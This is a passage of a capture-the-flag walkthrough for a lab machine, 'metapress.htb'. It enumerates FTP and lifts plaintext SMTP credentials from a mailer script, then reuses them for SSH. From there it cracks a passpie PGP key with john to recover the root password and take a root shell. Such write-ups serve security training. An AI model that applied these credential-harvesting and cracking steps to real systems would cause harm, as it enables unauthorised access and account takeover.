230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

```

### SSH

#### FTP Enumeration

The FTP root has two folders:

```

ftp> ls -la
229 Entering Extended Passive Mode (|||34675|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 0        metapress.htb     4096 Oct  5  2022 .
drwxr-xr-x   4 0        metapress.htb     4096 Oct  5  2022 ..
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
226 Transfer complete

```

The `blog` folder seems to have the website:

```

ftp> cd blog
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||43317|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 .
drwxr-xr-x   4 0        metapress.htb     4096 Oct  5  2022 ..
-rw-r--r--   1 metapress.htb metapress.htb      633 Jun 23  2022 .htaccess
-rw-r--r--   1 metapress.htb metapress.htb      405 Feb  6  2020 index.php
-rw-r--r--   1 metapress.htb metapress.htb    19915 Feb 12  2020 license.txt
-rw-r--r--   1 metapress.htb metapress.htb     7278 Jun 26  2020 readme.html
-rw-r--r--   1 metapress.htb metapress.htb     7101 Jul 28  2020 wp-activate.php
drwxr-xr-x   9 metapress.htb metapress.htb     4096 Oct  5  2022 wp-admin
-rw-r--r--   1 metapress.htb metapress.htb      351 Feb  6  2020 wp-blog-header.php
-rw-r--r--   1 metapress.htb metapress.htb     2328 Oct  8  2020 wp-comments-post.php
-rw-r--r--   1 metapress.htb metapress.htb     2032 Jun 23  2022 wp-config.php
-rw-r--r--   1 metapress.htb metapress.htb     2913 Feb  6  2020 wp-config-sample.php
drwxr-xr-x   6 metapress.htb metapress.htb     4096 Oct  5  2022 wp-content
-rw-r--r--   1 metapress.htb metapress.htb     3939 Jul 30  2020 wp-cron.php
drwxr-xr-x  25 metapress.htb metapress.htb    12288 Oct  5  2022 wp-includes
-rw-r--r--   1 metapress.htb metapress.htb     2496 Feb  6  2020 wp-links-opml.php
-rw-r--r--   1 metapress.htb metapress.htb     3300 Feb  6  2020 wp-load.php
-rw-r--r--   1 metapress.htb metapress.htb    49831 Nov  9  2020 wp-login.php
-rw-r--r--   1 metapress.htb metapress.htb     8509 Apr 14  2020 wp-mail.php
-rw-r--r--   1 metapress.htb metapress.htb    20975 Nov 12  2020 wp-settings.php
-rw-r--r--   1 metapress.htb metapress.htb    31337 Sep 30  2020 wp-signup.php
-rw-r--r--   1 metapress.htb metapress.htb     4747 Oct  8  2020 wp-trackback.php
-rw-r--r--   1 metapress.htb metapress.htb     3236 Jun  8  2020 xmlrpc.php
226 Transfer complete

```

I’ll grab the `.htaccess` file as that can have creds in it, but nothing useful this time. I can’t write to the folder:

```

ftp> put test.txt
local: test.txt remote: test.text
229 Entering Extended Passive Mode (|||39107|)
550 test.txt: Operation not permitted

```

If I was able to, I could write a webshell and get execution that way.

The `mailer` folder has a script and another folder:

```

ftp> ls
229 Entering Extended Passive Mode (|||10672|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5  2022 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
226 Transfer complete

```

The script is using PHP to send emails, and in the middle, there are creds for the SMTP server:

```

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;

```

#### SSH

I noted above that jnelson was an account in the `passwd` file. Those creds work for SSH:

```

oxdf@hacky$ sshpass -p 'Cb4_JmWM8zUZWMu@Ys' ssh jnelson@metapress.htb
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
...[snip]...
jnelson@meta2:~$ 

```

And I can read `user.txt`:

```

jnelson@meta2:~$ cat user.txt
2ff6d592************************

```

## Shell as root

### Enumeration

#### jnelson

jnelson can’t run anything as root with `sudo`:

```

jnelson@meta2:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for jnelson: 
Sorry, user jnelson may not run sudo on meta2.

```

In their home directory, there’s an interesting hidden folder, `.passpie`:

```

jnelson@meta2:~$ ls -la
total 32
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 Apr 10 01:55 user.txt

```

This looks to be for an opensource command line password manager, [passpie](https://github.com/marcwebbie/passpie). Running it prints some passwords:

```

jnelson@meta2:/home$ passpie
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛

```

Running with `--help` will show the possible commands. Anything that might print the password like `copy` or `export` prompts to ask for a password:

```

jnelson@meta2:/home$ passpie copy root
Passphrase: 

```

#### .passpie

The passpie directory has a folder named `ssh` (which is the name on both entries), as well as two files, `.config` and `.keys`. `.config` is just `{}`. `.keys` is a PGP key, with public and private blocks.

`ssh` has two files, each with the same format:

```

jnelson@meta2:~/.passpie/ssh$ ls
jnelson.pass  root.pass
jnelson@meta2:~/.passpie/ssh$ cat root.pass 
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----

  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B
  -----END PGP MESSAGE-----

  '

```

The file is YAML with metadata and where the password would be, a PGP encrypted message.

### Crack PGP Key

#### Format Hash

I’ll copy the key to my host with `scp`:

```

oxdf@hacky$ sshpass -p 'Cb4_JmWM8zUZWMu@Ys' scp jnelson@metapress.htb:./.passpie/.keys keys

```

To format the key into a hash that can be cracked, I’ll try to run `gpg2john`, but it complains:

```

oxdf@hacky$ gpg2john keys 

File keys
Error: Ensure that the input file keys contains a single private key only.
Error: No hash was generated for keys, ensure that the input file contains a single private key only.

```

I’ll remove the public block, and re-run, and it works:

```

oxdf@hacky$ gpg2john keys | tee gpg.hash

File keys
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::keys

```

#### Crack

Hashcat doesn’t seem to support GPG yet, so I’ll use `john`. It breaks almost instantly:

```

oxdf@hacky$ /opt/john/run/john --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt gpg.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:01 DONE (2023-04-23 12:05) 0.7462g/s 125.3p/s 125.3c/s 125.3C/s peanut..987654
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

### su

#### Get Password

I’ll use the `passpie copy` command, which has a `--to` parameter:

```

jnelson@meta2:~$ passpie copy --help
Usage: passpie copy [OPTIONS] FULLNAME

  Copy credential password to clipboard/stdout

Options:
  --passphrase TEXT
  --to [stdout|clipboard]  Copy password destination
  --clear INTEGER          Automatically clear password from clipboard
  --help                   Show this message and exit.

```

It works:

```

jnelson@meta2:~$ passpie copy --to stdout --passphrase blink182 root@ssh
p7qfAZt4_A1xo_0x

```

#### su

From there, `su` will give a root shell:

```

jnelson@meta2:~$ su -
Password: 
root@meta2:~# 

```

And the root flag:

```

root@meta2:~# cat root.txt
241a9937************************

```